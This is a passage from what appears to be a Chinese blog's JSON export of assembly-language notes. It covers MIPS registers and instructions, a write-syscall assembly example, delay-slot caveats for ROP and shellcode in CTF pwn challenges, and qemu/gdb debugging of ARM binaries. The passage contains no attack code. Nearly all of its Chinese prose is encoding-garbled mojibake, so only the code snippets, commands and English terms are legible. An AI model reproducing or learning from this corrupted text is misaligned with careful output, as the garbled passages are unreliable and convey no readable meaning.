ä¹‹ä¸€ã€‚\n\n- $2..$3:($v0-$v1)\n\nç”¨äºå­ç¨‹åºçš„éæµ®ç‚¹ç»“æœæˆ–è¿”å›å€¼ï¼Œå¯¹äºå­ç¨‹åºå¦‚ä½•ä¼ é€’å‚æ•°åŠå¦‚ä½•è¿”å›ï¼ŒMIPSèŒƒå›´æœ‰ä¸€å¥—çº¦å®šï¼Œå †æ ˆä¸­å°‘æ•°å‡ ä¸ªä½ç½®å¤„çš„å†…å®¹è£…å…¥CPUå¯„å­˜å™¨ï¼Œå…¶ç›¸åº”å†…å­˜ä½ç½®ä¿ç•™æœªåšå®šä¹‰ï¼Œå½“è¿™ä¸¤ä¸ªå¯„å­˜å™¨ä¸å¤Ÿå­˜æ”¾è¿”å›å€¼æ—¶ï¼Œç¼–è¯‘å™¨é€šè¿‡å†…å­˜æ¥å®Œæˆã€‚\n\n- $4..$7:($a0-$a3)\n\nç”¨æ¥ä¼ é€’å‰å››ä¸ªå‚æ•°ç»™å­ç¨‹åºï¼Œä¸å¤Ÿçš„ç”¨å †æ ˆã€‚a0-a3å’Œv0-v1ä»¥åŠraä¸€èµ·æ¥æ”¯æŒå­ç¨‹åºï¼è¿‡ç¨‹è°ƒç”¨ï¼Œåˆ†åˆ«ç”¨ä»¥ä¼ é€’å‚æ•°ï¼Œè¿”å›ç»“æœå’Œå­˜æ”¾è¿”å›åœ°å€ã€‚å½“éœ€è¦ä½¿ç”¨æ›´å¤šçš„å¯„å­˜å™¨æ—¶ï¼Œå°±éœ€è¦å †æ ˆï¼ˆstack)äº†,MIPSç¼–è¯‘å™¨æ€»æ˜¯ä¸ºå‚æ•°åœ¨å †æ ˆä¸­ç•™æœ‰ç©ºé—´ä»¥é˜²æœ‰å‚æ•°éœ€è¦å­˜å‚¨ã€‚\n\n- $8..$15:($t0-$t7)\n\nä¸´æ—¶å¯„å­˜å™¨ï¼Œå­ç¨‹åºå¯ä»¥ä½¿ç”¨å®ƒä»¬è€Œä¸ç”¨ä¿ç•™ã€‚\n\n- $16..$23:($s0-$s7)\n\nä¿å­˜å¯„å­˜å™¨ï¼Œåœ¨è¿‡ç¨‹è°ƒç”¨è¿‡ç¨‹ä¸­éœ€è¦ä¿ç•™ï¼ˆè¢«è°ƒç”¨è€…ä¿å­˜å’Œæ¢å¤ï¼Œè¿˜åŒ…æ‹¬$fpå’Œ$raï¼‰ï¼ŒMIPSæä¾›äº†ä¸´æ—¶å¯„å­˜å™¨å’Œä¿å­˜å¯„å­˜å™¨ï¼Œè¿™æ ·å°±å‡å°‘äº†å¯„å­˜å™¨æº¢å‡ºï¼ˆspilling,å³å°†ä¸å¸¸ç”¨çš„å˜é‡æ”¾åˆ°å­˜å‚¨å™¨çš„è¿‡ç¨‹),ç¼–è¯‘å™¨åœ¨ç¼–è¯‘ä¸€ä¸ªå¶ï¼ˆleaf)è¿‡ç¨‹ï¼ˆä¸è°ƒç”¨å…¶å®ƒè¿‡ç¨‹çš„è¿‡ç¨‹ï¼‰çš„æ—¶å€™ï¼Œæ€»æ˜¯åœ¨ä¸´æ—¶å¯„å­˜å™¨åˆ†é…å®Œäº†æ‰ä½¿ç”¨éœ€è¦ä¿å­˜çš„å¯„å­˜å™¨ã€‚\n\n- $24..$25:($t8-$t9)\n\nåŒ($t0-$t7) $26..$27:($k0,$k1)ä¸ºæ“ä½œç³»ç»Ÿï¼å¼‚å¸¸å¤„ç†ä¿ç•™ï¼Œè‡³å°‘è¦é¢„ç•™ä¸€ä¸ªã€‚ å¼‚å¸¸ï¼ˆæˆ–ä¸­æ–­ï¼‰æ˜¯ä¸€ç§ä¸éœ€è¦åœ¨ç¨‹åºä¸­æ˜¾ç¤ºè°ƒç”¨çš„è¿‡ç¨‹ã€‚MIPSæœ‰ä¸ªå«å¼‚å¸¸ç¨‹åºè®¡æ•°å™¨ï¼ˆexception program counter,EPC)çš„å¯„å­˜å™¨ï¼Œå±äºCP0å¯„å­˜å™¨ï¼Œç”¨äºä¿å­˜é€ æˆå¼‚å¸¸çš„é‚£æ¡æŒ‡ä»¤çš„åœ°å€ã€‚æŸ¥çœ‹æ§åˆ¶å¯„å­˜å™¨çš„å”¯ä¸€æ–¹æ³•æ˜¯æŠŠå®ƒå¤åˆ¶åˆ°é€šç”¨å¯„å­˜å™¨é‡Œï¼ŒæŒ‡ä»¤`mfc0`(move from system control)å¯ä»¥å°†EPCä¸­çš„åœ°å€å¤åˆ¶åˆ°æŸä¸ªé€šç”¨å¯„å­˜å™¨ä¸­ï¼Œé€šè¿‡è·³è½¬è¯­å¥ï¼ˆ`jr`)ï¼Œç¨‹åºå¯ä»¥è¿”å›åˆ°é€ æˆå¼‚å¸¸çš„é‚£æ¡æŒ‡ä»¤å¤„ç»§ç»­æ‰§è¡Œã€‚MIPSç¨‹åºå‘˜éƒ½å¿…é¡»ä¿ç•™ä¸¤ä¸ªå¯„å­˜å™¨$k0å’Œ$k1ï¼Œä¾›æ“ä½œç³»ç»Ÿä½¿ç”¨ã€‚\nå‘ç”Ÿå¼‚å¸¸æ—¶ï¼Œè¿™ä¸¤ä¸ªå¯„å­˜å™¨çš„å€¼ä¸ä¼šè¢«æ¢å¤ï¼Œç¼–è¯‘å™¨ä¹Ÿä¸ä½¿ç”¨k0å’Œk1,å¼‚å¸¸å¤„ç†å‡½æ•°å¯ä»¥å°†è¿”å›åœ°å€æ”¾åˆ°è¿™ä¸¤ä¸ªä¸­çš„ä»»ä½•ä¸€ä¸ªï¼Œç„¶åä½¿ç”¨jrè·³è½¬åˆ°é€ æˆå¼‚å¸¸çš„æŒ‡ä»¤å¤„ç»§ç»­æ‰§è¡Œã€‚\n\n- $28:($gp)\n\nä¸ºäº†ç®€åŒ–é™æ€æ•°æ®çš„è®¿é—®ï¼ŒMIPSè½¯ä»¶ä¿ç•™äº†ä¸€ä¸ªå¯„å­˜å™¨ï¼šå…¨å±€æŒ‡é’ˆgp(global pointer,$gp)ï¼Œå…¨å±€æŒ‡é’ˆæŒ‡å‘é™æ€æ•°æ®åŒºä¸­çš„è¿è¡Œæ—¶å†³å®šçš„åœ°å€ï¼Œåœ¨å­˜å–ä½äºgpå€¼ä¸Šä¸‹32KBèŒƒå›´å†…çš„æ•°æ®æ—¶ï¼Œåªéœ€è¦ä¸€æ¡ä»¥gpä¸ºåŸºæŒ‡é’ˆçš„æŒ‡ä»¤å³å¯ã€‚åœ¨ç¼–è¯‘æ—¶ï¼Œæ•°æ®é¡»åœ¨ä»¥gpä¸ºåŸºæŒ‡é’ˆçš„64KBèŒƒå›´å†…ã€‚\n\n- $29:($sp)\n\nMIPSç¡¬ä»¶å¹¶ä¸ç›´æ¥æ”¯æŒå †æ ˆï¼Œä½ å¯ä»¥æŠŠå®ƒç”¨äºåˆ«çš„ç›®çš„ï¼Œä½†ä¸ºäº†ä½¿ç”¨åˆ«äººçš„ç¨‹åºæˆ–è®©åˆ«äººä½¿ç”¨ä½ çš„ç¨‹åºï¼Œè¿˜æ˜¯è¦éµå®ˆè¿™ä¸ªçº¦å®šçš„ï¼Œä½†è¿™å’Œç¡¬ä»¶æ²¡æœ‰å…³ç³»ã€‚\n\n- $30:($fp)\n\nGNU MIPS Cç¼–è¯‘å™¨ä½¿ç”¨äº†å¸§æŒ‡é’ˆ(frame pointer),è€ŒSGIçš„Cç¼–è¯‘å™¨æ²¡æœ‰ä½¿ç”¨ï¼Œè€ŒæŠŠè¿™ä¸ªå¯„å­˜å™¨å½“ä½œä¿å­˜å¯„å­˜å™¨ä½¿ç”¨ï¼ˆ$s8),è¿™èŠ‚çœäº†è°ƒç”¨å’Œè¿”å›å¼€é”€ï¼Œä½†å¢åŠ äº†ä»£ç ç”Ÿæˆçš„å¤æ‚æ€§ã€‚\n\n- $31:($ra)\n\nå­˜æ”¾è¿”å›åœ°å€ï¼ŒMIPSæœ‰ä¸ª`jal`(jump-and-link,è·³è½¬å¹¶ é“¾æ¥)æŒ‡ä»¤ï¼Œåœ¨è·³è½¬åˆ°æŸä¸ªåœ°å€æ—¶ï¼ŒæŠŠä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€æ”¾åˆ°$raä¸­ã€‚ç”¨äºæ”¯æŒå­ç¨‹åºï¼Œä¾‹å¦‚è°ƒç”¨ç¨‹åºæŠŠå‚æ•°æ”¾åˆ°$a0~$a3,ç„¶å`jal X`è·³åˆ°Xè¿‡ç¨‹ï¼Œè¢«è°ƒè¿‡ç¨‹å®ŒæˆåæŠŠç»“æœæ”¾åˆ°$v0,$v1,ç„¶åä½¿ç”¨`jr $ra`è¿”å›ã€‚\n\n\n\n## 2.æ±‡ç¼–æŒ‡ä»¤\n\n### (1)ä¸åŒç±»å‹çš„æŒ‡ä»¤\n\n#### Rå‹æŒ‡ä»¤ï¼šæ“ä½œå¯„å­˜å™¨\n\nå¸¸è§æŒ‡ä»¤ï¼š`add`, `sub`, `and`, `or`, `nor`, `slt`, `sll`, `srl`, `jr`\n\n![image-20211230150231733](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20211230150231733.png)\n\n- opcodï¼šæ“ä½œç  \n- rsï¼šæºå¯„å­˜å™¨çš„æ•°é‡ \n- rtï¼šæºå¯„å­˜å™¨çš„æ•°é‡ \n- rdï¼šç›®æ ‡å¯„å­˜å™¨çš„ç¼–å·\n- shamï¼šç§»ä½é‡ï¼ˆæ“ä½œç§»ä½çš„ä½æ•°ï¼‰\n- Func: å‡½æ•°ï¼ˆæ“ä½œç æ‰©å±•ï¼‰ \n\nShamä»…ç”¨äºæ“ä½œåç§»é‡çš„æŒ‡ä»¤ï¼ˆä¾‹å¦‚`stl`ï¼‰\n\n#### Iå‹æŒ‡ä»¤ï¼šæ“ä½œå¸¸é‡\n\nå¸¸è§æŒ‡ä»¤ï¼š`addi`, `lw`, `sw`, `lh`, `sh`, `lb`, `lbu`, `sb`, `ll`, `sc`, `lui`, `andi`, `ori`, `beq`, `bne`, `slti`, `sltiu`\n\n- opcodï¼šæ“ä½œç \n- rsï¼šæºå¯„å­˜å™¨çš„æ•°é‡\n- rdï¼šæºæˆ–ç›®æ ‡å¯„å­˜å™¨çš„æ•°é‡\n- imd: ç«‹å³å€¼\n\n\n\n#### Jå‹æŒ‡ä»¤ï¼šè·³è·ƒå¯»å€\n\nå¤„ç†å™¨ç›´æ¥è·³è·ƒåˆ°ç»™å®šçš„åœ°å€ï¼Œæ‰§è¡Œæ‰€åœ¨åœ°å€çš„æŒ‡ä»¤\n\nå¸¸è§æŒ‡ä»¤ï¼š`j`, `jal`\n\n![image-20211230150255746](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20211230150255746.png)\n\n- Opcodï¼šæ“ä½œç \n- Imdï¼šç«‹å³å€¼\n\n\n\n### (2)å¸¸ç”¨æŒ‡ä»¤\n\nå…¶ä¸­`i`è¡¨ç¤ºç«‹å³æ•°ç›¸å…³ï¼Œ`u`è¡¨ç¤ºæ— ç¬¦å·ç›¸å…³ã€‚\n\n#### â‘ load/store æŒ‡ä»¤\n\n##### la\n\nå°†åœ°å€æˆ–è€…æ ‡ç­¾å­˜å…¥ä¸€ä¸ªå¯„å­˜å™¨ eg:`la $t0,val_1`å¤åˆ¶val_lçš„åœ°å€åˆ°$t0ä¸­ï¼Œval_1æ˜¯ä¸€ä¸ªLabel\n\n##### li\n\nå°†ç«‹å³æ•°å­˜å…¥é€šç”¨å¯„å­˜å™¨ eg:`li $t1, 40` $t1 = 40\n\n##### lw\n\nä»æŒ‡å®šçš„åœ°å€åŠ è½½ä¸€ä¸ªwordç±»å‹çš„å€¼åˆ°ä¸€ä¸ªå¯„å­˜å™¨ eg:`lw $s0, 0($sp) $s0=MEM[$sp+0]`\n\n##### sw\n\nå°†å¯„å­˜å™¨çš„å€¼ï¼Œå­˜äºæŒ‡å®šçš„åœ°å€wordç±»å‹ eg:`sw $a0, 0($sp) MEM[$sp+0] = $a0`\n\n##### move\n\nå¯„å­˜å™¨ä¼ å€¼ egï¼š`move $t5, $t2 $t5 = $t2`\n\n#### â‘¡ç®—æ•°æŒ‡ä»¤\n\nç®—æ•°æŒ‡ä»¤çš„æ‰€æœ‰æ“ä½œéƒ½æ˜¯å¯„å­˜å™¨ï¼Œä¸èƒ½æ˜¯ RAM åœ°å€æˆ–é—´æ¥å¯»å€ã€‚ä¸”æ“ä½œæ•°å¤§å°éƒ½æ˜¯ wordï¼ˆ4byteï¼‰\n\n```asm\nadd $t0, $t1, $t2;\t\t$t0=$t1+$t2;\tå¸¦ç¬¦å·æ•°ç›¸åŠ \nsub $t0, $t1, $t2;\t\t$t0=$t1-$t2;\tå¸¦ç¬¦å·æ•°ç›¸å‡\naddi $t0, $t1, 5;\t\t$t0=$t1+5;\t\tæœ‰ç«‹å³æ•°çš„åŠ æ³•\naddu $t0, $t1, $t2;\t\t$t0=$t1+$t2;\tæ— ç¬¦å·æ•°çš„åŠ æ³•\nsubu $t0, $t1, $t2;\t\t$t0=$t1-$t2;\tå¸¦ç¬¦å·æ•°ç›¸å‡\nmult $t3, $t3;\t\t\t(HI, LO) = $t3 * $t4\ndiv $t5, $t6;\t\t\t$Hi=$t5 mod $t6\nmfhi $t0;\t\t\t\t$t0 = $Hi\nmflo $t1;\t\t\t\t$t1 = $Lo\n```\n\n#### â‘¢syscall\n\näº§ç”Ÿä¸€ä¸ªè½¯åŒ–ä¸­æ–­ï¼Œå®ç°ç³»ç»Ÿè°ƒç”¨ï¼›ç³»ç»Ÿè°ƒç”¨å·å­˜æ”¾åœ¨ $v0 ä¸­ï¼Œå‚æ•°åœ¨ $a0~$a3 ä¸­ï¼›\n\nè¿”å›å€¼åœ¨ $v0 ä¸­ï¼Œå¦‚æœå‡ºé”™ï¼Œåœ¨ $a3 ä¸­è¿”å›é”™è¯¯å·ï¼›åœ¨ç¼–å†™ shellcode æ—¶ï¼Œç”¨åˆ°è¯¥æŒ‡ä»¤æœºåˆ¶\n\nWrite(1, â€œABCnâ€, 5) å®ç°å¦‚ä¸‹\n\n```asm\naddiu $sp, $sp, -32;\nli $a0, 1;\nlui $t6, 0x4142;\nori $t6, $t6, 0x430a;\nsw  $t6, $0($sp);\naddiu $a1, $sp, 0;\nli $a2, 5;\nli $v0, 4004;\nsyscall;\n```\n\n#### â‘£åˆ†æ”¯è·³è½¬æŒ‡ä»¤\n\nåˆ†æ”¯è·³è½¬æŒ‡ä»¤æœ¬èº«å¯ä»¥é€šè¿‡æ¯”è¾ƒä¸¤ä¸ªå¯„å­˜å™¨å†³å®šå¦‚ä½•è·³è½¬ï¼›å¦‚æœæƒ³è¦å®ç°ä¸ç«‹å³æ•°çš„æ¯”è¾ƒè·³è½¬ï¼Œéœ€è¦ç»“åˆç±»è·³è½¬æŒ‡ä»¤å®ç°\n\n```asm\nb target;\t\t\t\tæ— æ¡ä»¶è·³è½¬åˆ°targetå¤„\nbeq $t0, $t1, target;\tå¦‚æœ\"$t0 == $t1â€ï¼Œè·³è½¬åˆ°target\nblt $t0, $t1, target;\tå¦‚æœâ€œ$t0 < $t1â€ï¼Œè·³è½¬åˆ°target\nble $t0, $t1, target;\tå¦‚æœâ€œ$t0 <= $t1â€ è·³è½¬åˆ°target\nbgt;\nblt;\nbne;\t\t\t\t\tç±»æ¯”ä¸Š\n```\n\n#### â‘¤è·³è½¬æŒ‡ä»¤\n\n```asm\nj target;\t\t\tæ— æ¡ä»¶è·³è½¬target\njr $t3;\t\t\t\tè·³è½¬åˆ°$t3æŒ‡å‘çš„åœ°å€å¤„(Jump Register)\njal target;\t\t\tè·³è½¬åˆ°targetï¼Œå¹¶ä¿å­˜è¿”å›åœ°å€åˆ°$raä¸­\n```\n\n#### â‘¥å­å‡½æ•°çš„è°ƒç”¨\n\n```asm\njal   sub_routine_label;å¤åˆ¶å½“å‰PCçš„å€¼åˆ°$raä¸­ï¼Œï¼ˆå½“å‰PCå€¼å°±æ˜¯è¿”å›åœ°å€ï¼‰ç¨‹åºè·³è½¬åˆ°sub_routine_label\n```\n\n#### â‘¦å­å‡½æ•°çš„è¿”å›\n\n```asm\njr    $ra;å¦‚æœå­å‡½æ•°é‡å¤åµŒå¥—ï¼Œåˆ™å°†$raçš„å€¼ä¿å­˜åœ¨å †æ ˆä¸­ï¼Œå› ä¸º$raæ€»æ˜¯ä¿å­˜å½“å‰æ‰§è¡Œçš„å­å‡½æ•°çš„è¿”å›åœ°å€\n```\n\n\n\nä»¥ä¸Šå¤§å¤šå‚è€ƒå¦‚ä¸‹\n\n[MIPSæ±‡ç¼–è¯­è¨€å…¥é—¨ - Sylvain's Blog (valeeraz.github.io)](https://valeeraz.github.io/2020/05/08/architecture-mips/)\n\n[2021ç¬¬å››å±Šå¼ºç½‘æ‹Ÿæ€é˜²å¾¡ç§¯åˆ†èµ›å·¥æ§pwn eserver WP - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/259594)\n\n\n\n## 3.æµæ°´çº¿ç‰¹ç‚¹\n\nä»¥ä¸‹æŒ‡ä»¤çš„ï¼Œstrchr å‡½æ•°çš„å‚æ•°æ¥è‡ª $s0 è€Œä¸æ˜¯ $s2\n\n```asm\nmov $a0, $s2;\njalr strchr;\nmove $a0, $s0;\n```\n\n## ğŸ”ºæ³¨ï¼šæµæ°´çº¿\n\nå³è·³è½¬ä¹‹å‰ä¼šå…ˆä¸€æ­¥åŠ è½½ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œæ‰€ä»¥åœ¨å¯»æ‰¾ROPæ—¶ï¼Œæ³¨æ„çœ‹ä¸‹ä¸€æ­¥æŒ‡ä»¤éƒ½æ˜¯ä»€ä¹ˆï¼Œä¸ç„¶è·³è½¬è¿‡å»å‚æ•°æˆ–è€…æ ˆå¸§éƒ½æœ‰å¯èƒ½ä¼šå‡ºé”™çš„ã€‚\n\nä½†æ˜¯å› ä¸ºé€šå¸¸PWNé¢˜çš„MIPSé€šå¸¸æ˜¯ç”¨qemuçš„useræ¨¡å¼è¿è¡Œçš„ï¼Œè¿™ä¸ªå¯èƒ½å¯¼è‡´æŒ‡ä»¤æµæ°´æœ‰æ—¶å€™è¡¨ç°ä¸å‡ºæ¥ï¼Œæ‰€ä»¥ä¸æ²¡æœ‰è°ƒç”¨å‡½æ•°sleep(1)å»å°†æ•°æ®åŒºåˆ·æ–°åˆ°æŒ‡ä»¤åŒºåŸŸä¹Ÿæ˜¯å¯ä»¥æ‹¿åˆ°shellçš„ï¼›ä½†æ˜¯å¦‚æœé¢˜ç›®ä½¿ç”¨systemæ¨¡å¼éƒ¨ç½²ï¼Œæ·»åŠ è°ƒç”¨å‡½æ•°åˆ·æ–°æ•°æ®åŒºåŸŸå†è·³è½¬åˆ°shellcodeå°±å¾ˆå¿…è¦äº†ï¼Œä½†å¦‚æœæ˜¯ROPæ¥getshellå€’æ˜¯ä¸ç”¨åˆ·æ–°æ•°æ®ã€‚\n\n","tags":["æ±‡ç¼–"],"categories":["æ±‡ç¼–","æ±‡ç¼–"]},{"title":"Armä»0å¼€å§‹","url":"/2021/11/02/å¼‚æ„ä»0å¼€å§‹/","content":"\n\n\n# å‰è¨€\n\nè®°å½•ä¸€ä¸‹å¼‚æ„çš„PWNé¢˜\n\nğŸ”ºqemu çš„ user æ¨¡å¼ä¸‹ï¼Œæ‰€ä»¥å³ä¾¿ç¨‹åºé‡å¯ libc åœ°å€ä¹Ÿä¸å˜ï¼Œä½†æ˜¯systemæ¨¡å¼ï¼Œå³åŠ äº†å†…æ ¸çš„æƒ…å†µä¸‹å°±ä¼šæ”¹å˜äº†ã€‚\n\n# ä¸€ã€è°ƒè¯•é—®é¢˜\n\n## 1.ARMæ¶æ„\n\npwndbgå¯¹armæ¶æ„çš„æ”¯æŒè¿˜æ˜¯æŒºå¥½çš„\n\n### (1)æ— PIE\n\næ²¡æœ‰PIEçš„æ—¶å€™ï¼Œç›´æ¥ä½¿ç”¨patchelfå°†å…¶é“¾æ¥å™¨å’Œæœç´¢è·¯å¾„æ”¹ä¸€ä¸‹å³å¯\n\n```bash\npatchelf --set-rpath /home/hacker/glibc/2.23/arm/ --set-interpreter /home/hacker/glibc/2.23/arm/lib/ld-linux.so.3 ./armNote\n```\n\nç„¶åé€šè¿‡qemuåŠ è½½è¿è¡Œåº“å¯åŠ¨\n\n```bash\nqemu-arm -L /home/hacker/glibc/2.23/arm/ -g 12345 ./armNote\n```\n\nä¹‹åé€šè¿‡gdb-multiarchè¿æ¥ä¸Šå³å¯\n\n```bash\ngdb-multiarch -q armNote\ntarget remote: 12345\n```\n\nè¿™æ ·å°±èƒ½è°ƒè¯•äº†ï¼ŒåŒ…æ‹¬pwndbgä¸­çš„å †å—heapï¼Œbinså‘½ä»¤ç­‰ä¹Ÿå¯ä»¥ä½¿ç”¨ã€‚\n\n![image-20211121161707292](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121161707.png)\n\n![image-20211121161725233](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121161725.png)\n\n### (2)æœ‰PIE\n\nè¿™ä¸ªå°±æ¯”è¾ƒå¤æ‚äº†ï¼Œé¦–å…ˆè¿˜æ˜¯æ”¹æ‰ç”¨é“¾æ¥å™¨å’Œæœç´¢è·¯å¾„ï¼Œä¹‹åè¿è¡Œèµ·æ¥ï¼ŒæŸ¥çœ‹vmmap\n\n![image-20211121162647509](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121162647.png)\n\nè¿™é‡Œåœ¨stackçš„æœ«å°¾ï¼Œå³å›¾ä¸­è“è‰²æ¡†èµ·æ¥çš„å°±æ˜¯elfåŸºåœ°å€ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œåæ­£è°ƒè¯•å°±æ˜¯è¿™æ ·çš„ï¼Œå¯èƒ½æ˜¯QEMUå’ŒPIEçš„ç›¸å…³æœºåˆ¶é—®é¢˜æŠŠã€‚\n\nä¹‹åé€šè¿‡elfBaseæ¥æ–­ç‚¹ï¼Œå†é€šè¿‡gotè¡¨å³å¯æ‰¾åˆ°libcåŸºåœ°å€äº†ã€‚\n\n![image-20211121163058346](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121163058.png)\n\n![image-20211121163230165](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121163230.png)\n\nä¹‹åå†é€šè¿‡`add-symbol-file`å³å¯å¾—åˆ°åœ°å€äº†ï¼Œåœ°å€ç”±äºqemuçš„å…³ç³»ï¼Œä¸€ç›´æ˜¯ä¸å˜çš„ã€‚\n\nä½†æ˜¯è¿™é‡Œå¦‚æœç›´æ¥æ‰“å°åœ°å€ä¼šå‡ºé”™ï¼ŒåŸå› æœªçŸ¥ï¼Œéœ€è¦é‡è½½ç¬¦å·è¡¨\n\n![image-20211121163909059](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121163909.png)\n\n![image-20211121164400425](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121164400.png)\n\né‡è½½ç¬¦å·è¡¨å¦‚ä¸‹\n\n![image-20211121164500582](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121164500.png)\n\nå¯ä»¥çœ‹åˆ°ä¹‹åå°±æ­£ç¡®äº†ã€‚\n\nä¸è¿‡è¿˜æ˜¯æ²¡æœ‰åŠæ³•è¿›è¡Œbinsï¼Œheapä¹‹ç±»çš„å‘½ä»¤ã€‚è¿™ä¸ªå‘½ä»¤æ˜¯pwndbgä»`__libc_malloc_initialized`è¿™ä¸ªå…¨å±€ç¬¦å·è·å–çš„ï¼Œä½†æ˜¯æ·»åŠ äº†ç¬¦å·è¡¨ä¹‹åè¿™ä¸ªå…¨å±€ç¬¦å·è¿˜æ˜¯æ²¡æœ‰è¢«é‡æ–°åŠ è½½\n\n![image-20211121165405192](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121165405.png)\n\nå¯¼è‡´æ— æ³•è¯†åˆ«ï¼Œæ‰€ä»¥ä¹Ÿå°±æ— æ³•ä½¿ç”¨å †ç›¸å…³å‘½ä»¤ï¼Œä¸è¿‡å¯ä»¥ä»main_arenä¸­ç®€å•çœ‹ä¸€ä¸‹å †ç»“æ„\n\n![image-20211121170328689](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121170328.png)\n\n## 2.MIPSæ¶æ„\n\n### (1)æ— PIE\n\nå¯ä»¥ç›´æ¥è¿›è¡Œç›¸åº”è¿è¡Œåº“åŠ è½½å³å¯ï¼Œä½†æ˜¯æœ€å¥½è¿˜æ˜¯ç”¨gefæ’ä»¶ã€‚\n\n### (2)æœ‰PIE\n\npwndbgå¯¹mipsæ¶æ„çš„æ”¯æŒä¸å¤ªå¥½ï¼Œä½†æ˜¯ä¹Ÿç”±äºgefå…³äºqemuçš„vmmapå‘½ä»¤ä¸å¤ªå‡†ç¡®ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥å€ŸåŠ©pwndbgçš„vmmapå‘½ä»¤è·å–ï¼Œå¦‚åŒä¹‹å‰çš„armæ¶æ„ä¸€æ ·ï¼Œè·å–åˆ°elfåŸºåœ°å€ä¹‹åå³å¯æŸ¥çœ‹å¯¹åº”çš„libcåœ°å€ã€‚\n\n## é¡¹ç›®ï¼š\n\næˆ–è€…çœ‹é¡¹ç›®ï¼Œè¿™ä¸ªå¯ä»¥ä¸€é”®è·å–å¯¹åº”ç‰ˆæœ¬çš„glibcï¼Œåœ¨gdbè°ƒè¯•ä¸­è‡ªåŠ¨è§£æç¬¦å·è¡¨å’Œåœ°å€ï¼Œæ–¹ä¾¿åšå¼‚æ„çš„pwné¢˜ã€‚\n\n`mulArchAll`:https://github.com/PIG-007/mulArchAll.git\n\n\n\n\n\n# äºŒã€ARM\n\n## 1.å¯„å­˜å™¨å…³ç³»\n\n![32](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211103145318.png)\n\n- R0~R3ï¼šå‡½æ•°è°ƒç”¨å‚æ•°ï¼Œä»£è¡¨ç¬¬0~4ä¸ªå‚æ•°ï¼Œå‰©ä¸‹çš„å‚æ•°ä»å³å‘å·¦ä¾æ¬¡å…¥æ ˆï¼Œå‡½æ•°è¿”å›å€¼ä¿å­˜åœ¨R0ä¸­ã€‚(å¯¹åº”åœ¨aarch64ä¸­ä¸ºR0~R7ï¼Œä½†æ˜¯gdbè°ƒè¯•æˆ–è€…IDAä¸­ä¸€èˆ¬æ˜¾ç¤ºX0~X30ï¼ŒåŒæ—¶è¿˜æœ‰ä½32ä½çš„W0~W30)\n\n- SPï¼šç±»ä¼¼rsp,espï¼Œæ ˆæŒ‡é’ˆ\n\n- FPï¼šç±»ä¼¼ebpï¼Œæ ˆæŒ‡é’ˆ\n- LRï¼šå½“å‘ç”Ÿå‡½æ•°è°ƒç”¨æ—¶ï¼Œä¼šä¿å­˜è°ƒç”¨å‡½æ•°å¤„çš„åœ°å€ï¼Œé€€å‡ºå‡½æ•°æ—¶èµ‹å€¼ç»™PCã€‚\n\n- PCï¼šç±»ä¼¼eip,ripï¼Œå­˜å‚¨ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ã€‚\n\n- R11ï¼šç±»ä¼¼ebpï¼Œæ ˆæŒ‡é’ˆï¼Œå…¶å®å°±å·®ä¸å¤šæ˜¯FP\n\n## 2.æ±‡ç¼–æŒ‡ä»¤\n\n### (1)å¯„å­˜å™¨ä¼ é€MOV\n\nå¯„å­˜å™¨ä¹‹é—´è¿˜æ˜¯MOVæŒ‡ä»¤ï¼Œæ¯”å¦‚MOV R2,R0;ä½†æ˜¯å¦‚æœæ¶‰åŠåˆ°å†…å­˜ä¸Šçš„ï¼Œåˆ™éœ€è¦å…ˆåŠ è½½åˆ°å¯„å­˜å™¨ä¸­ï¼Œæˆ–è€…æŠŠå¯„å­˜å™¨ä¸­çš„å€¼å­˜å‚¨åˆ°å†…å­˜ä¸­\n\n### (2)å¯„å­˜å™¨-å†…å­˜ä¼ é€\n\nSTR(store reg)/LDR(load reg)ä»¥åŠSTM(store multiple)/LDM(load multiple)\n\n#### â‘ STR/LDRæ¨¡å¼\n\n##### STR Ra [Rb]ï¼š\n\nRaä¸­çš„æ•°æ®å­˜å‚¨åˆ°RbæŒ‡å‘çš„å†…å­˜ä¸­\n\n##### LDR Ra [Rb]\n\nRbæŒ‡å‘çš„å†…å­˜ä¸­çš„å€¼åŠ è½½åˆ°Raä¸­\n\næ­¤å¤–è¿˜æœ‰å¦‚ä¸‹æƒ…å½¢\n\n```\nSTR  R0,[R1, #12]  // R0 --> [R1+12]\nLDR  R4,[R5, R6]  // R4 <-- [R5+R6]\n```\n\n\n\n#### â‘¡STM/LDMæ¨¡å¼\n\n##### STM R0, {R4,R5}\n\nR4çš„å€¼ä¼ é€ç»™R0+xå¯¹åº”çš„å†…å­˜å•å…ƒï¼Œç„¶åR5çš„å€¼ä¼ ç»™R0+x+xå¯¹åº”çš„å†…å­˜å•å…ƒ\n\nè¿™ä¸ªxå³ç”±åç¼€å†³å®šï¼Œåˆ†åˆ«æœ‰ä»¥ä¸‹å‡ ç§\n\n- DB(Decrease Before)ï¼šæ¯æ¬¡ä¼ é€å‰R0åŠ ä¸Šxï¼Œxä¸ºè´Ÿæ•°\n\n- DA(Decrease After)ï¼šæ¯æ¬¡ä¼ é€åR0åŠ ä¸Šxï¼Œxä¸ºè´Ÿæ•°\n\n- IB(Increase Before)ï¼šæ¯æ¬¡ä¼ é€å‰R0åŠ ä¸Šxï¼Œxä¸ºæ­£æ•°\n- IA(Increase After)ï¼šæ¯æ¬¡ä¼ é€åR0åŠ 